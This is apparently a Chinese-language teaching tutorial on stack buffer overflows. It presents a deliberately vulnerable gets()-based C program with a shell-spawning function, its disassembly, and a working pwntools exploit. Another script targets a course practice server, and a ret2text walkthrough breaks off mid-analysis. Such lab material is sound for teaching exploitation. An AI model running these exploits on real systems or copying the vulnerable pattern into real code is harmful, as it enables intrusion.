<p>你可以看到前面有一堆rwx或者’-‘之类的,这就代表用户对该文件的权限,<code>ls</code>这条命令是我们比较常用的命令,他是list的缩写,作用是列举当前目录下的文件(目录类似于文件夹). 后面的 <code>-al</code>是两个参数,a代表<em>all</em>,l代表<em>line</em>,就是把所有的文件(包含隐藏文件)按行展示出来.就是上面的结果,顺便一提,名字以<code>.</code>开头的文件都是隐藏文件比如<code>.hello.cpp</code>,ls命令不加参数a无法看到隐藏文件.</p>
</blockquote>
</blockquote>
<p>你可以使用图形化的编辑器vscode gedit或者leafpad编写程序,我是vim爱好者,不建议你们使用vim(逃</p>
<p>下面来个简单的例子:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pwn</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">char</span> hello[] = <span class="string">"Hello,I'm dyf."</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,hello);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\nQAQ\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\nDo you have something to say?\n"</span>);</span><br><span class="line">    gets(buffer);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    vulnerable();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这个程序的逻辑就是读取一段字符串,然后将其输出,理论上来说pwn()函数是没有被执行的,但是利用stackoverflow我们可以控制程序执行pwn()函数,他会返回给我们一个shell.</p>
<blockquote>
<p>shell十分不严谨的描述: linux下的终端<br>我们希望通过这个程序来获得一个可以执行命令的终端,这样就可以控制目标靶机.</p>
</blockquote>
<p>我们用如下命令进行编译:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; sudo gcc -o a buffer.c -no-pie -m32 -fno-stack-protector</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>注:</p>
<blockquote>
<p>这里使用sudo只是为了将生成的目标文件的owner设置为root,当你以普通身份提权后可是获得root权限</p>
</blockquote>
</blockquote>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@Aurora:/home/code/pwn/challenge/1 <span class="comment"># sudo gcc -o a buffer.c -no-pie -m32 -fno-stack-protector </span></span><br><span class="line">buffer.c: In <span class="keyword">function</span> ‘vulnerable’:</span><br><span class="line">buffer.c:14:5: warning: implicit declaration of <span class="keyword">function</span> ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]</span><br><span class="line">     gets(buffer);</span><br><span class="line">     ^~~~</span><br><span class="line">     fgets</span><br><span class="line">/bin/ld: /tmp/ccQDe6dj.o: <span class="keyword">in</span> <span class="keyword">function</span> `vulnerable<span class="string">':</span></span><br><span class="line"><span class="string">buffer.c:(.text+0x97): 警告：the `gets'</span> <span class="keyword">function</span> is dangerous and should not be used.</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;可见gets本身是一个十分危险的函数,他不会检查字符串的长度,而是以回车来判断输入是否结束,及其容易引发栈溢出.</p>
<p>&emsp;&emsp;解释一下这几个参数的作用:</p>
<ul>
<li><code>-m32</code>:指的是生成32位程序</li>
<li><code>-fno-stack-protector</code>:字面意思,关闭栈保护,不生成canary</li>
<li><code>-no-pie</code>:关闭pie(Position Independent Executable),这个pie并不能吃,他使程序的地址被打乱,导致我们无法返回到固定目标地址.</li>
</ul>
<p>&emsp;&emsp;你可以使用如下命令来运行它:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; ./a</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;编译成功后我们可以使用checksec工具检查编译生成的文件:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Aurora:/home/code/pwn/challenge/1 <span class="comment"># checksec a </span></span><br><span class="line">[*] <span class="string">'/home/code/pwn/challenge/1/a'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>下面我们来分析一下这个vulnerable()函数:<br>首先,大家可以使用objdump工具进行反汇编,得到目标文件a的汇编代码:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; objdump -d a</span><br></pre></td></tr></table></figure>
<p>然后找到这一段:</p>
<blockquote>
<p>注:</p>
<blockquote>
<p>你们的地址与我的不同是正常的(一样就怪了…),所以下面的过程要求你理解原理</p>
</blockquote>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">080491ad &lt;vulnerable&gt;:</span><br><span class="line"> 80491ad:       55                      push   %ebp</span><br><span class="line"> 80491ae:       89 e5                   mov    %esp,%ebp</span><br><span class="line"> 80491b0:       53                      push   %ebx</span><br><span class="line"> 80491b1:       83 ec 34                sub    $0x34,%esp</span><br><span class="line"> 80491b4:       e8 07 ff ff ff          call   80490c0 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line"> 80491b9:       81 c3 47 2e 00 00       add    $0x2e47,%ebx</span><br><span class="line"> 80491bf:       c7 45 c9 48 65 6c 6c    movl   $0x6c6c6548,-0x37(%ebp)</span><br><span class="line"> 80491c6:       c7 45 cd 6f 2c 49 27    movl   $0x27492c6f,-0x33(%ebp)</span><br><span class="line"> 80491cd:       c7 45 d1 6d 20 64 79    movl   $0x7964206d,-0x2f(%ebp)</span><br><span class="line"> 80491d4:       66 c7 45 d5 66 2e       movw   $0x2e66,-0x2b(%ebp)</span><br><span class="line"> 80491da:       c6 45 d7 00             movb   $0x0,-0x29(%ebp)</span><br><span class="line"> 80491de:       83 ec 0c                sub    $0xc,%esp</span><br><span class="line"> 80491e1:       8d 45 c9                lea    -0x37(%ebp),%eax</span><br><span class="line"> 80491e4:       50                      push   %eax</span><br><span class="line"> 80491e5:       e8 56 fe ff ff          call   8049040 &lt;puts@plt&gt;</span><br><span class="line"> 80491ea:       83 c4 10                add    $0x10,%esp</span><br><span class="line"> 80491ed:       83 ec 0c                sub    $0xc,%esp</span><br><span class="line"> 80491f0:       8d 83 10 e0 ff ff       lea    -0x1ff0(%ebx),%eax</span><br><span class="line"> 80491f6:       50                      push   %eax</span><br><span class="line"> 80491f7:       e8 44 fe ff ff          call   8049040 &lt;puts@plt&gt;</span><br><span class="line"> 80491fc:       83 c4 10                add    $0x10,%esp</span><br><span class="line"> 80491ff:       83 ec 0c                sub    $0xc,%esp</span><br><span class="line"> 8049202:       8d 83 18 e0 ff ff       lea    -0x1fe8(%ebx),%eax</span><br><span class="line"> 8049208:       50                      push   %eax</span><br><span class="line"> 8049209:       e8 32 fe ff ff          call   8049040 &lt;puts@plt&gt;</span><br><span class="line"> 804920e:       83 c4 10                add    $0x10,%esp</span><br><span class="line"> 8049211:       83 ec 0c                sub    $0xc,%esp</span><br><span class="line"> 8049214:       8d 45 d8                lea    -0x28(%ebp),%eax</span><br><span class="line"> 8049217:       50                      push   %eax</span><br><span class="line"> 8049218:       e8 13 fe ff ff          call   8049030 &lt;gets@plt&gt;</span><br><span class="line"> 804921d:       83 c4 10                add    $0x10,%esp</span><br><span class="line"> 8049220:       90                      nop</span><br><span class="line"> 8049221:       8b 5d fc                mov    -0x4(%ebp),%ebx</span><br><span class="line"> 8049224:       c9                      leave  </span><br><span class="line"> 8049225:       c3                      ret</span><br></pre></td></tr></table></figure>
<p><img src="./pictures/a1.png" alt="a1"></p>
<p>我猜你开始不想看了,别着急,我们直接看关键处:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">8049214:       8d 45 d8                lea    -0x28(%ebp),%eax</span><br><span class="line">8049217:       50                      	  push   %eax</span><br><span class="line">8049218:       e8 13 fe ff ff          call   8049030 &lt;gets@plt&gt;</span><br><span class="line">804921d:       83 c4 10                add    $0x10,%esp</span><br><span class="line">8049220:       90                      	  nop</span><br><span class="line">8049221:       8b 5d fc                mov    -0x4(%ebp),%ebx</span><br><span class="line">8049224:       c9                      	  leave  </span><br><span class="line">8049225:       c3                      	  ret</span><br></pre></td></tr></table></figure>
<p>我们可以看到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lea 		-028(%ebp), %eax   ;将某字符串地址传给%eax寄存器</span><br><span class="line">push	 %eax							  ;将%eax中的值压入栈中,作为下一个函数gets()的参数</span><br><span class="line">call		8049030&lt;gets@plt&gt;;调用gets()</span><br></pre></td></tr></table></figure></p>
<p>这三句话首先传参,然后调用函数,然后程序释放栈并返回.该字符串距离ebp的长度为0x28,对应的栈结构为:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |     retaddr     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |     saved ebp   |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x28--&gt;+-----------------+</span><br></pre></td></tr></table></figure>
<p>接着我们继续查找pwn()函数的地址,其地址为0x08049182.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">08049182 &lt;pwn&gt;:</span><br><span class="line"> 8049182:       55                      push   %ebp</span><br><span class="line"> 8049183:       89 e5                   mov    %esp,%ebp</span><br><span class="line"> 8049185:       53                      push   %ebx</span><br><span class="line"> 8049186:       83 ec 04                sub    $0x4,%esp</span><br><span class="line"> 8049189:       e8 b4 00 00 00          call   8049242 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line"> 804918e:       05 72 2e 00 00          add    $0x2e72,%eax</span><br><span class="line"> 8049193:       83 ec 0c                sub    $0xc,%esp</span><br><span class="line"> 8049196:       8d 90 08 e0 ff ff       lea    -0x1ff8(%eax),%edx</span><br><span class="line"> 804919c:       52                      push   %edx</span><br><span class="line"> 804919d:       89 c3                   mov    %eax,%ebx</span><br><span class="line"> 804919f:       e8 ac fe ff ff          call   8049050 &lt;system@plt&gt;</span><br><span class="line"> 80491a4:       83 c4 10                add    $0x10,%esp</span><br><span class="line"> 80491a7:       90                      nop</span><br><span class="line"> 80491a8:       8b 5d fc                mov    -0x4(%ebp),%ebx</span><br><span class="line"> 80491ab:       c9                      leave  </span><br><span class="line"> 80491ac:       c3                      ret</span><br></pre></td></tr></table></figure></p>
<p>加入我们输入的字符串为:<code>0x28 * &#39;a&#39; + &#39;bbbb&#39; + pwn_addr</code>,那么由于gets只有读到回车才停,所以这一段字符串会把saved_ebp覆盖为bbbb,将ret_addr覆盖为pwn_addr,那么,此时栈的结构为:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |    0x08049182   |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |       bbbb      |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注:</p>
<blockquote>
<p>前面提到,在内存中,每个值按照字节存储.一般都是按照小端存储,所以0x08049182在内存中的形式为</p>
</blockquote>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x82\x91\x04\x08</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;很明显,按照ASCII表,这几个字符是不可见的(0x82 0x91 0x04 0x08 这几个老哥在ascii表中的值请自行查看对照)</p>
<p>那么问题来了,怎么才能把这这种不可见字符输进去呢,莫非要买高级键盘?_?,这个时候我们就可以用pwntools了,pwntools是一个很好用的python2的库,专门帮你干坏事.</p>
<p>利用代码如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!	/usr/bin/python2</span></span><br><span class="line"><span class="comment">#选择python2解释器</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment">#设置utf-8编码,为了支持中文</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  <span class="comment">#引入pwntools的库</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span> <span class="comment"># 开启debug模式,可以记录发送和收到的字符串</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./a'</span>)  <span class="comment">#构造与程序交互的对象</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">40</span> + <span class="string">'bbbb'</span> + p32(<span class="number">0x08049182</span>)  <span class="comment"># 构造payload</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)  <span class="comment"># 将字符串发送给程序</span></span><br><span class="line"></span><br><span class="line">sh.interactive() <span class="comment"># 将代码变为手动交互</span></span><br></pre></td></tr></table></figure>
<p>然后我们执行一下这个命令:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@Aurora:/home/code/pwn/challenge/1 <span class="comment"># ./a.py</span></span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./a'</span>: pid 10160</span><br><span class="line">[DEBUG] Sent 0x31 bytes:</span><br><span class="line">    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    00000020  61 61 61 61  61 61 61 61  62 62 62 62  82 91 04 08  │aaaa│aaaa│bbbb│····│</span><br><span class="line">    00000030  0a                                                  │·│</span><br><span class="line">    00000031</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[DEBUG] Received 0x33 bytes:</span><br><span class="line">    <span class="string">"Hello,I'm dyf.\n"</span></span><br><span class="line">    <span class="string">'\n'</span></span><br><span class="line">    <span class="string">'QAQ\n'</span></span><br><span class="line">    <span class="string">'\n'</span></span><br><span class="line">    <span class="string">'Do you have something to say?\n'</span></span><br><span class="line">Hello,I<span class="string">'m dyf.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">QAQ</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Do you have something to say?</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure>
<p>可以看到我们已经返回了shell,这意味着我们拿到了这台机器的控制权限,加入这个程序的owner是root的话,我们就会获得root权限.</p>
<p>这个时候,按照传统,我们要输入一条神圣的指令来证明我们的身份:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; whoami</span><br></pre></td></tr></table></figure>
<p><img src="./pictures/a2.png" alt="a2"></p>
<p>&emsp;&emsp;很酷是不是,一下子就获得上帝的权限,root就是linux中的上帝,掌握一切生杀大权,到此为止,你已经拿下了你的第一台主机了.</p>
<p>接下来我会把之前提到的那个样例程序放到服务器上供你们娱乐,你么可以尝试练习一下.</p>
<p>关于exp连接远端的方式:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!	/usr/bin/python2</span></span><br><span class="line"><span class="comment">#选择python2解释器</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment">#设置utf-8编码,为了支持中文</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  <span class="comment">#引入pwntools的库</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span> <span class="comment"># 开启debug模式,可以记录发送和收到的字符串</span></span><br><span class="line"></span><br><span class="line">sh = romote(<span class="string">'202.204.62.222'</span>,<span class="number">30008</span>) <span class="comment"># 只需要修改这一句话,填写对应的ip地址和端口 remote('ip', port)</span></span><br><span class="line"><span class="comment">#sh = process('./a')  #构造与程序交互的对象</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">40</span> + <span class="string">'bbbb'</span> + p32(<span class="number">0x08049182</span>)  <span class="comment"># 构造payload</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)  <span class="comment"># 将字符串发送给程序</span></span><br><span class="line"></span><br><span class="line">sh.interactive() <span class="comment"># 将代码变为手动交互</span></span><br></pre></td></tr></table></figure>
<p>最后来介绍一下动态调试技巧,主要是关于gdb的使用.我相信8成的人写代码仍然使用十分复古的调试方法:</p>
<ul>
<li>放置调试法:什么也不做等着bug消失</li>
<li>再来一次调试法: 一定是编译器坏了,重新编译一次等bug消失</li>
<li>玄学调试法: 随便改两个地方,用命运的力量消除bug</li>
<li>放弃调试法: 洗洗睡了</li>
</ul>
<p>以上调试方法比较传统,而且操作难度教较大,下面我们来介绍一下很简单的gdb调试法.</p>
<p>&emsp;&emsp;gdb(GNU Debugger)是所有调试器的爸爸,他的功能十分强大,可以跟踪堆栈,查看内存,打印寄存器,下断点等等,我们只讲以下基本技巧:</p>
<ol>
<li>下断点</li>
<li>查看内存</li>
<li>打印寄存器</li>
<li>查看反汇编执行</li>
</ol>
<p>&emsp;&emsp;我们仍然用个栗子讲解,首先下载并打开<a href="https://github.com/Explainaur/USTB_Assembly_Documention/raw/master/src/example_2/ret2text" target="_blank" rel="noopener">附件</a>ret2text,然后你可以输入<code>ls</code>命令查看一下这个文件是不是绿色的,如果不是则说明没有可执行权限,你需要输入以下命令对其进行原谅:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x ret2txt</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这个时候他应该已经被原谅了,我们查看一下他的保护措施:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Aurora:~/文档/doc/src/example_2(master⚡) <span class="comment"># checksec ret2text </span></span><br><span class="line">[*] <span class="string">'/root/\xe6\x96\x87\xe6\xa1\xa3/doc/src/example_2/ret2text'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;可以看到这是一个32位程序,只开启了NX保护(Not Executable 栈不可执行),下面进行逆向分析.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">08048648 &lt;main&gt;:</span><br><span class="line"> 8048648:       55                      push   %ebp</span><br><span class="line"> 8048649:       89 e5                   mov    %esp,%ebp</span><br><span class="line"> 804864b:       83 e4 f0                and    $0xfffffff0,%esp</span><br><span class="line"> 804864e:       83 c4 80                add    $0xffffff80,%esp</span><br><span class="line"> 8048651:       a1 60 a0 04 08          mov    0x804a060,%eax</span><br><span class="line"> 8048656:       c7 44 24 0c 00 00 00    movl   $0x0,0xc(%esp)</span><br><span class="line"> 804865d:       00 </span><br><span class="line"> 804865e:       c7 44 24 08 02 00 00    movl   $0x2,0x8(%esp)</span><br><span class="line"> 8048665:       00 </span><br><span class="line"> 8048666:       c7 44 24 04 00 00 00    movl   $0x0,0x4(%esp)</span><br><span class="line"> 804866d:       00 </span><br><span class="line"> 804866e:       89 04 24                mov    %eax,(%esp)</span><br><span class="line"> 8048671:       e8 5a fe ff ff          call   80484d0 &lt;setvbuf@plt&gt;</span><br><span class="line"> 8048676:       a1 40 a0 04 08          mov    0x804a040,%eax</span><br><span class="line"> 804867b:       c7 44 24 0c 00 00 00    movl   $0x0,0xc(%esp)</span><br><span class="line"> 8048682:       00 </span><br><span class="line"> 8048683:       c7 44 24 08 01 00 00    movl   $0x1,0x8(%esp)</span><br><span class="line"> 804868a:       00 </span><br><span class="line"> 804868b:       c7 44 24 04 00 00 00    movl   $0x0,0x4(%esp)</span><br><span class="line"> 8048692:       00 </span><br><span class="line"> 8048693:       89 04 24                mov    %eax,(%esp)</span><br><span class="line"> 8048696:       e8 35 fe ff ff          call   80484d0 &lt;setvbuf@plt&gt;</span><br><span class="line"> 804869b:       c7 04 24 6c 87 04 08    movl   $0x804876c,(%esp)</span><br><span class="line"> 80486a2:       e8 d9 fd ff ff          call   8048480 &lt;puts@plt&gt;</span><br><span class="line"> 80486a7:       8d 44 24 1c             lea    0x1c(%esp),%eax</span><br><span class="line"> 80486ab:       89 04 24                mov    %eax,(%esp)</span><br><span class="line"> 80486ae:       e8 ad fd ff ff          call   8048460 &lt;gets@plt&gt;</span><br><span class="line"> 80486b3:       c7 04 24 a4 87 04 08    movl   $0x80487a4,(%esp)</span><br><span class="line"> 80486ba:       e8 91 fd ff ff          call   8048450 &lt;printf@plt&gt;</span><br><span class="line"> 80486bf:       b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line"> 80486c4:       c9                      leave  </span><br><span class="line"> 80486c5:       c3                      ret</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;还原一下大概就是:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"There is something amazing here, do you know anything?"</span>);</span><br><span class="line">  gets((<span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Maybe I will tell you next time !"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;可以看到十分明显的gets()函数,然后我们又发现secure()函数存在<code>system(&quot;/bin/sh&quot;)</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">804863a:       c7 04 24 63 87 04 08    movl   $0x8048763,(%esp)   ;这里传递参数 &quot;/bin/sh&quot; 复习一下传参方式哦</span><br><span class="line">8048641:       e8 4a fe ff ff          call   8048490 &lt;system@plt&gt;</span><br><span class="line">8048646:       c9                      leave  </span><br><span class="line">8048647:       c3                      ret</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;假如我们可以返回到0x804863a似乎就可以直接getshell了,下面我们就分析如何构造payload,首先要确定padding的长度.</p>
<blockquote>
<p>padding就是我们所能控制的内存到返回值的距离内所填充的垃圾数据,就是上个例子里一堆aaaaaaaa</p>
</blockquote>
<p>&emsp;&emsp;通过分析汇编代码我们发现事情并不简单:</p>
